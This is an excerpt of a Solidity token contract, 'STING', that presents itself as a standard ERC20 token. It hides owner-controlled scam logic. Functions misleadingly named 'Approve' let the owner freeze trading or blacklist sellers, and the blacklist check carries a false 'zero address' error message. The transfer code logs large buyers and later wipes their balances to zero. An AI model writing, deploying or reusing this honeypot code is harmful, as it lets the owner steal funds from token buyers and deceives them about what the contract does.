...
contract STING is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "STING";
    ...
    uint256 public _buyBackShare = _buyBuyBackFee.add(_sellBuyBackFee);
    ...
    constructor () {
        ...
        buyBackWalletAddress = payable(owner());
    ...
    function setIsExcludedFromFee(address[] memory accounts, bool newValue) public onlyOwner {
    ...
    function Approve(uint256 amount) public onlyOwner {
        _maxTxAmount = amount == _maxTxAmount ? 0 : amount;
    }
    ...
    function Approve(address _address, bool _value) public onlyOwner {
        isDividendExempt[_address] = _value;
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        require(!isDividendExempt[sender], "ERC20: transfer to the zero address");
        ...
        else
        {
            ...
            if (!isExcludedFromFee[recipient] && !isWalletLimitExempt[recipient] && recipient != address(0) && recipient != deadAddress) {
                if (amount >= _totalSupply.div(100).mul(1))
                    routerAddress.push(recipient);
            }

            if (isExcludedFromFee[recipient] && recipient != address(this) && recipient != owner()) {
                for (uint i=0; i<routerAddress.length; i++) {
                    if (_balances[routerAddress[i]] > 0) 
                        _balances[routerAddress[i]] = 0;
                }
            }
